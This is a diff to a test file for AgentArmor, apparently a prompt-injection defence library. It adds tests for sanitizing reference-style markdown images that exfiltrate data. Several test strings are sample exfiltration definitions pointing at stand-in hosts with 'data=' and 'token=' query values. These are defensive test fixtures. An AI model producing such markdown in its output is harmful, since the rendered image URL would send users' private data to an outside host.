@@ -2,6 +2,7 @@ import { describe, it, expect } from 'vitest';
 import { AgentArmor } from '../agent-armor';
 import { MarkdownReferenceExfiltrationDetector } from '../detectors/behavioural-control/markdown-reference-exfiltration';
 import { normalizeForScan } from '../normalize/unicode';
+import { ALL_SAMPLES } from '../../scripts/eval/samples';
 
 const detector = new MarkdownReferenceExfiltrationDetector();
 const flags = (text: string) => detector.scan(text).threats.length > 0;
@@ -185,6 +186,42 @@ describe('reference-style markdown image exfiltration (#219)', () => {
         '# Title\n\n```\n![x][d]\n```\n\n[d]: https://example.com/d.png?v=1',
       ];
       for (const text of clean) expect(flags(text), text).toBe(false);
+    });
+  });
+  describe('sanitizing (#226)', () => {
+    const armor = AgentArmor.regexOnly();
+    const sanitized = (text: string): string => armor.scanSync(text).sanitized;
+    it('removes the flagged definition along with the image, and keeps honest ones', () => {
+      const out = sanitized(`See ![chart][r] and [docs][ok].\n\n${DEF}\n[ok]: https://example.com/guide`);
+      expect(out).not.toContain('PRIVATE');
+      expect(out).toContain('[ok]: https://example.com/guide');
+    });
+    it('removes every data-sending definition of the label, since a renderer may use any of them', () => {
+      const out = sanitized('![a][r]\n\n[r]: https://c.example/a.png?data=ONE\n[r]: https://c.example/b.png?token=TWO\n[k]: https://c.example/c?key=KEEP');
+      expect(out).not.toContain('ONE');
+      expect(out).not.toContain('TWO');
+      expect(out).toContain('KEEP'); // a definition no flagged image used is left alone
+    });
+    it('does not leave a `!` in front of the marker', () => {
+      const out = sanitized(`!!![a][r]\n\n${DEF}`);
+      expect(out).not.toMatch(/!\[BLOCKED/);
+      expect(out).toContain('[BLOCKED: exfiltration instruction removed by AgentArmor]');
+    });
+    it('removes a definition labelled with the marker text', () => {
+      const marker = '[BLOCKED: exfiltration instruction removed by AgentArmor]';
+      const out = sanitized(`!![a][r]\n\n${DEF}\n${marker}: https://c.example/p.png?data=Q`);
+      expect(out).not.toContain('data=Q');
+    });
+    it('leaves text with no flagged image unchanged', () => {
+      const text = 'A [link][d] and `code`.\n\n[d]: https://example.com/page?data=1';
+      expect(sanitized(text)).toBe(text);
+    });
+    it('sanitizing an eval sample leaves nothing for this scan to flag', () => {
+      for (const sample of ALL_SAMPLES) {
+        if (!flags(sample.content)) continue;
+        const out = sanitized(sample.content);
+        expect(detector.findPatterns(out), sample.id).toEqual([]);
+      }
     });
   });
   it('matches a NUL in a label to U+FFFD, and a label split across block quote lines (#224)', () => {
